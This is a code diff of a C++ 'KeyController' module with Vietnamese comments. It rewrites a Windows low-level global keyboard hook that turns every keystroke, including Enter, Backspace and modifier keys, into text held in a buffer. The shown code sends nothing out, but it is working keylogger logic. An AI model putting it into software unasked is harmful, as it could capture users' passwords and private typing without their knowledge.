@@ -1,5 +1,104 @@
 ﻿#include "../../include/Modules/KeyController.h"
 
+// #ifdef _WIN32
+// #include <windows.h>
+// #include <thread>
+// #include <mutex>
+// #include <atomic>
+// namespace {
+//     std::string keyBuffer;
+//     std::mutex bufferMutex;
+//     std::thread msgThread;
+//     std::atomic<bool> running(false);
+//     HHOOK hKeyboardHook = nullptr;
+
+//     // **********************************************
+//     // * HÀM KEYCODETOCHAR ĐÃ ĐƯỢC CẬP NHẬT HOÀN TOÀN *
+//     // **********************************************
+//     std::string KeyCodeToChar(DWORD vkCode, KBDLLHOOKSTRUCT* pKey) {
+//         // 1. Lấy trạng thái bàn phím hiện tại (bao gồm Shift, Ctrl, Alt, Caps Lock)
+//         BYTE keyState[256];
+//         if (!GetKeyboardState(keyState)) return "";
+
+//         // 2. Dịch mã VK thành ký tự Unicode (WCHAR)
+//         WCHAR buffer[5];
+//         int result = ToUnicodeEx(
+//             vkCode,
+//             pKey->scanCode,
+//             keyState,
+//             buffer,
+//             _countof(buffer),
+//             0,
+//             GetKeyboardLayout(0)
+//         );
+
+//         if (result > 0) {
+//             // Chuyển đổi từ WCHAR (UTF-16) sang std::string (chỉ lấy ký tự đầu tiên nếu cần)
+//             return std::string(buffer, buffer + result);
+//         }
+
+//         // 3. Xử lý các phím đặc biệt không có ký tự in (ví dụ: Enter, Backspace)
+//         switch (vkCode) {
+//         case VK_RETURN: return "[ENTER]";
+//         case VK_SPACE: return " ";
+//         case VK_BACK: return "[BKSP]";
+//         case VK_TAB: return "[TAB]";
+//         case VK_LCONTROL:
+//         case VK_RCONTROL: return "[CTRL]";
+//         case VK_LSHIFT:
+//         case VK_RSHIFT: return "[SHIFT]";
+//         case VK_LMENU:
+//         case VK_RMENU: return "[ALT]";
+//         }
+
+//         // Bỏ qua các phím chức năng khác 
+//         return "";
+//     }
+
+//     LRESULT CALLBACK GlobalKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+//         if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+//             KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
+
+//             // * CÁCH GỌI HÀM CŨNG ĐƯỢC CẬP NHẬT *
+//             std::string s = KeyCodeToChar(pKey->vkCode, pKey);
+
+//             // Chỉ ghi vào buffer nếu có ký tự hợp lệ được dịch
+//             if (!s.empty()) {
+//                 std::lock_guard<std::mutex> lock(bufferMutex);
+//                 keyBuffer += s;
+//             }
+//         }
+//         return CallNextHookEx(nullptr, nCode, wParam, lParam);
+//     }
+
+//     void runLoop() {
+//         // ... (Giữ nguyên phần này)
+//         hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, GlobalKeyboardProc, GetModuleHandle(nullptr), 0);
+//         MSG msg;
+//         running = true;
+//         while (running) {
+//             while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
+//                 TranslateMessage(&msg);
+//                 DispatchMessage(&msg);
+//             }
+//             Sleep(5);
+//         }
+//         if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
+//         hKeyboardHook = nullptr;
+//     }
+
+//     void StartWin() {
+//         running = true;
+//         msgThread = std::thread(runLoop);
+//         Sleep(100); // Đảm bảo thread khởi tạo xong
+//     }
+//     void StopWin() {
+//         running = false;
+//         if (msgThread.joinable()) msgThread.join();
+//     }
+// }
+// #endif
+
 #ifdef _WIN32
 #include <windows.h>
 #include <thread>
@@ -12,68 +111,83 @@ namespace {
     std::atomic<bool> running(false);
     HHOOK hKeyboardHook = nullptr;
 
-    // **********************************************
-    // * HÀM KEYCODETOCHAR ĐÃ ĐƯỢC CẬP NHẬT HOÀN TOÀN *
-    // **********************************************
-    std::string KeyCodeToChar(DWORD vkCode, KBDLLHOOKSTRUCT* pKey) {
-        // 1. Lấy trạng thái bàn phím hiện tại (bao gồm Shift, Ctrl, Alt, Caps Lock)
-        BYTE keyState[256];
-        if (!GetKeyboardState(keyState)) return "";
-
-        // 2. Dịch mã VK thành ký tự Unicode (WCHAR)
-        WCHAR buffer[5];
-        int result = ToUnicodeEx(
-            vkCode,
-            pKey->scanCode,
-            keyState,
-            buffer,
-            _countof(buffer),
-            0,
-            GetKeyboardLayout(0)
-        );
-
-        if (result > 0) {
-            // Chuyển đổi từ WCHAR (UTF-16) sang std::string (chỉ lấy ký tự đầu tiên nếu cần)
-            return std::string(buffer, buffer + result);
+    // ================================
+    // RAW KEY MAPPING (KHÔNG UNICODE)
+    // ================================
+    char vkToChar(DWORD vk, bool shift) {
+        // A–Z
+        if (vk >= 'A' && vk <= 'Z') {
+            if (shift) return (char)vk;         // Shift → chữ hoa
+            else return (char)(vk + 32);        // thường → chữ thường
         }
 
-        // 3. Xử lý các phím đặc biệt không có ký tự in (ví dụ: Enter, Backspace)
+        // 0–9
+        if (vk >= '0' && vk <= '9') return (char)vk;
+
+        switch (vk) {
+        case VK_OEM_1: return shift ? ':' : ';';
+        case VK_OEM_2: return shift ? '?' : '/';
+        case VK_OEM_3: return shift ? '~' : '`';
+        case VK_OEM_4: return shift ? '{' : '[';
+        case VK_OEM_5: return shift ? '|' : '\\';
+        case VK_OEM_6: return shift ? '}' : ']';
+        case VK_OEM_7: return shift ? '"' : '\'';
+        case VK_OEM_COMMA:  return shift ? '<' : ',';
+        case VK_OEM_PERIOD: return shift ? '>' : '.';
+        case VK_OEM_MINUS:  return shift ? '_' : '-';
+        case VK_OEM_PLUS:   return shift ? '+' : '=';
+        }
+
+        return 0;
+    }
+
+    // ========================================
+    // HÀM MỚI: KHÔNG DÙNG ToUnicodeEx NỮA
+    // ========================================
+    std::string KeyCodeToRaw(DWORD vkCode) {
+        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+        bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+
+        // Xử lý các phím đặc biệt
         switch (vkCode) {
-        case VK_RETURN: return "[ENTER]";
-        case VK_SPACE: return " ";
-        case VK_BACK: return "[BKSP]";
-        case VK_TAB: return "[TAB]";
-        case VK_LCONTROL:
-        case VK_RCONTROL: return "[CTRL]";
-        case VK_LSHIFT:
-        case VK_RSHIFT: return "[SHIFT]";
-        case VK_LMENU:
-        case VK_RMENU: return "[ALT]";
+            case VK_RETURN: return "[ENTER]";
+            case VK_SPACE: return " ";
+            case VK_BACK: return "[BKSP]";
+            case VK_TAB: return "[TAB]";
+            case VK_LCONTROL:
+            case VK_RCONTROL: return "[CTRL]";
+            case VK_LSHIFT:
+            case VK_RSHIFT: return "[SHIFT]";
+            case VK_LMENU:
+            case VK_RMENU: return "[ALT]";
         }
 
-        // Bỏ qua các phím chức năng khác 
-        return "";
+        char c = vkToChar(vkCode, shift ^ caps); // XOR để xử lý CapsLock
+
+        if (c != 0) return std::string(1, c);
+
+        return ""; // không map được
     }
 
     LRESULT CALLBACK GlobalKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+
             KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
 
-            // * CÁCH GỌI HÀM CŨNG ĐƯỢC CẬP NHẬT *
-            std::string s = KeyCodeToChar(pKey->vkCode, pKey);
+            std::string s = KeyCodeToRaw(pKey->vkCode);
 
-            // Chỉ ghi vào buffer nếu có ký tự hợp lệ được dịch
             if (!s.empty()) {
                 std::lock_guard<std::mutex> lock(bufferMutex);
                 keyBuffer += s;
             }
         }
+
         return CallNextHookEx(nullptr, nCode, wParam, lParam);
     }
 
     void runLoop() {
-        // ... (Giữ nguyên phần này)
         hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, GlobalKeyboardProc, GetModuleHandle(nullptr), 0);
+
         MSG msg;
         running = true;
         while (running) {
@@ -90,8 +204,9 @@ namespace {
     void StartWin() {
         running = true;
         msgThread = std::thread(runLoop);
-        Sleep(100); // Đảm bảo thread khởi tạo xong
+        Sleep(100);
     }
+
     void StopWin() {
         running = false;
         if (msgThread.joinable()) msgThread.join();
